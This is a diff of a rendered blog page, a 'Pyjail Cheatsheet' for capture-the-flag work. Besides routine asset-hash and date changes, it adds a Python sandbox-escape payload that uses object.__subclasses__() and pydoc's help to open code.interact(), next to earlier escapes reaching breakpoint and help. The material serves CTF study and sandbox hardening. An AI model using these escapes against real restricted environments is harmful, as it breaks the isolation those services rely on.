@@ -27,13 +27,13 @@
     <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-58a37c92.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-26a02b4a.js">
+	<link rel="modulepreload" href="/_app/immutable/start-2a5be00d.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-03a8413b.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-5251ce6f.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -57,7 +57,7 @@
 <section class="content"><div><h1>Pyjail Cheatsheet</h1>
 
   <p><b>Date:</b>
-    November 24, 2024</p>
+    November 27, 2024</p>
 
   <p><b>Category:</b>
     <span><a href="/blog/category/cheatsheet">cheatsheet</a></span></p>
@@ -337,7 +337,8 @@ delete_me <span class="token operator">=</span> <span class="token string">""</s
 <li>load modules by entering module names:<ul class="list"><li><code>__main__</code> - should already be loaded, help page shown if so</li>
 <li><code>pdb</code> - similar to importing pdb</li>
 <li><code>antigravity</code> - similar to importing antigravity</li>
-<li><code>PROGRAM_NAME</code> / <code>jail</code> / <code>app</code> - similar to importing and rerunning program if not wrapped in <code>if __name__ == &quot;__main__&quot;:</code></li></ul></li>
+<li><code>PROGRAM_NAME</code> / <code>jail</code> / <code>app</code> - similar to importing and rerunning program if not wrapped in <code>if __name__ == &quot;__main__&quot;:</code></li>
+<li>note: loading modules would also add related imported classes to <code>object.__subclasses__()</code></li></ul></li>
 <li>see <a href="https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md" rel="noopener" class="text-link" target="_blank">SECCON Beginners CTF 2022: hitchhike4b</a></li></ul>
 <pre class="language-py"><!-- HTML_TAG_START --><code class="language-py"><span class="token comment"># load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins</span>
 <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># help()</span>
@@ -389,6 +390,11 @@ jail
 
 <span class="token comment"># @maple3142 - overwrite dunder to call breakpoint</span>
 <span class="token punctuation">[</span>c<span class="token operator">:=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token operator">:=</span>c<span class="token punctuation">.</span>copy<span class="token punctuation">.</span>__builtins__<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span>c<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> c<span class="token punctuation">.</span>items <span class="token keyword">in</span><span class="token punctuation">[</span>b<span class="token punctuation">[</span><span class="token string">'breakpoint'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+
+<span class="token comment"># @nagi - calls code.interact() from object.__subclasses__ after triggering pydoc once w/ module containing code.InteractiveInterpreter</span>
+<span class="token punctuation">[</span>s<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">,</span>s<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>s<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"interact"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+code
+q
 
 <span class="token comment"># @keymoon - retrieve help from &lt;class 'enum._EnumDict'></span>
 <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>update<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'bltns'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -1784,13 +1790,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="1irz9ud">
-		import { set_public_env, start } from "/_app/immutable/start-26a02b4a.js";
+		<script type="module" data-sveltekit-hydrate="1hy5q6l">
+		import { set_public_env, start } from "/_app/immutable/start-2a5be00d.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="1irz9ud"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="1hy5q6l"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
